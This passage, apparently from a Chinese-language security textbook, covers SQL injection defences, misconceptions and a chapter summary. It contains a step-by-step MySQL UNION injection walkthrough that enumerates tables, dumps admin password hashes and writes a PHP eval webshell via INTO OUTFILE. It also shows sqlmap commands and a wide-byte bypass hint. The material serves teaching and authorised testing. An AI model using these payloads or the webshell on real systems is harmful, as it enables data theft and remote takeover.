-- 在my.cnf中设置 secure_file_priv = '' 限制文件操作
```

**WAF部署**

WAF作为外部防御层，可以拦截大部分自动化攻击：

```nginx
# ModSecurity + OWASP CRS 配置示例
SecRuleEngine On
SecRule REQUEST_URI|ARGS|REQUEST_HEADERS "@detectSQLi" \
    "id:1001,phase:2,deny,status:403,log,msg:'SQL Injection Detected'"
```

WAF应作为纵深防御的一环，而非唯一防线。它能挡住脚本小子的自动化扫描，但无法防御手动构造的高级注入。

**数据库防火墙**

数据库防火墙（如MySQL Enterprise Firewall、dbWatchdog）在数据库层面拦截异常SQL：

```sql
-- MySQL Enterprise Firewall
CALL mysql.sp_set_firewall_mode('webapp_readonly', 'RECORDING');
-- 运行一段时间收集正常SQL模式
CALL mysql.sp_set_firewall_mode('webapp_readonly', 'PROTECTING');
-- 此后不在白名单中的SQL语句将被拦截
```

#### 8.7.3 运维层防御

**日志监控**

```sql
-- MySQL开启通用查询日志（生产环境慎用，性能影响大）
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';

-- 更好的方案：使用MySQL Enterprise Audit或Percona Audit Plugin
INSTALL PLUGIN audit_log SONAME 'audit_log.so';
```

**定期安全审计**

```bash
# 使用sqlmap对自身应用进行安全测试
sqlmap -u "http://internal-app/page?id=1" --batch --level=5 --risk=3

# 使用OWASP ZAP进行自动化扫描
zap-cli quick-scan http://internal-app/
```

### 8.8 常见误区与纠正

**误区1："我用了WAF，所以不需要参数化查询"**

WAF可以被绕过，它只是辅助防御层。参数化查询是唯一能从根本上消除SQL注入的手段。

**误区2："存储过程是安全的"**

存储过程内部如果使用`EXEC`或`sp_executesql`拼接用户输入，同样存在注入风险。安全与否取决于具体实现。

**误区3："ORM框架自动防注入"**

ORM框架在正确使用时确实安全，但`raw()`、`extra()`、原生SQL等功能在不当使用时仍然存在注入风险。

**误区4："我的应用没有报错信息，所以没有SQL注入"**

没有报错信息只意味着报错注入不可用，布尔盲注和时间盲注仍然可能成功。

**误区5："转义函数能替代参数化查询"**

手动转义容易遗漏边界情况（如GBK编码下的宽字节注入`%bf%27`），且不同数据库的转义规则不同。参数化查询由数据库引擎处理，更可靠。

**误区6："数字型参数不需要防护"**

即使参数预期是数字，也应进行类型检查或使用参数化查询。不做检查的数字型注入同样危险。

### 8.9 实战案例：从信息收集到数据提取

以下演示一个完整的MySQL注入渗透流程（仅用于授权测试环境）。

**场景**：目标页面 `http://target/page?id=1`

```bash
# 第1步：确认注入点
# 请求1：id=1' → 页面报错 → 字符型注入
# 请求2：id=1 AND 1=1 → 页面正常
# 请求3：id=1 AND 1=2 → 页面异常 → 确认布尔注入可用

# 第2步：判断列数
?id=1' ORDER BY 3-- -   → 正常
?id=1' ORDER BY 4-- -   → 报错 → 列数为3

# 第3步：确定回显位
?id=-1' UNION SELECT 1,2,3-- - → 页面显示2和3

# 第4步：信息收集
?id=-1' UNION SELECT 1,@@version,@@datadir-- -
→ MySQL 5.7.34 | /var/lib/mysql/

?id=-1' UNION SELECT 1,user(),database()-- -
→ webapp@localhost | target_db

# 第5步：枚举表名
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='target_db'-- -
→ users,orders,products,admin

# 第6步：枚举列名
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='admin'-- -
→ id,username,password,email,role

# 第7步：提取数据
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password,0x0a),3 FROM admin-- -
→ admin:5f4dcc3b5aa765d61d8327deb882cf99
→ superadmin:e99a18c428cb38d5f260853678922e03

# 第8步：测试文件操作权限
?id=-1' UNION SELECT 1,@@secure_file_priv,3-- -
→ （空字符串=可读写）

# 第9步：写入WebShell（如需要）
?id=-1' UNION SELECT 1,'<?php @eval($_POST["cmd"]);?>',3 INTO OUTFILE '/var/www/html/uploads/shell.php'-- -
```

整个过程仅使用浏览器和手工构造的URL即可完成。自动化工具（如sqlmap）可以将这个流程压缩到几分钟内自动完成。

### 8.10 本章小结

| 维度 | 关键要点 |
|------|----------|
| **本质** | 用户输入被当作SQL代码执行，核心是信任边界违反 |
| **分类** | 按位置（GET/POST/Cookie/Header/二阶）和按技术（UNION/报错/布尔/时间/堆叠） |
| **数据库差异** | MySQL（information_schema）、PostgreSQL（pg_catalog）、MSSQL（sysobjects）、Oracle（数据字典视图）、SQLite（sqlite_master） |
| **WAF绕过** | 大小写、双写、编码、注释分割、空格替代、参数污染 |
| **自动化工具** | sqlmap为首选，支持tamper自定义和多种高级功能 |
| **防御核心** | 参数化查询 > 存储过程 > 输入验证 > WAF > 日志监控 |
| **高级技术** | 带外数据外传、二次注入、NoSQL注入、ORM注入 |

SQL注入防御的根本原则是**永远不要信任用户输入**——无论输入来自前端表单、API调用、Cookie、HTTP头还是数据库本身（二次注入场景）。参数化查询是消除这一类漏洞的终极武器，所有其他防御手段都是补充而非替代。
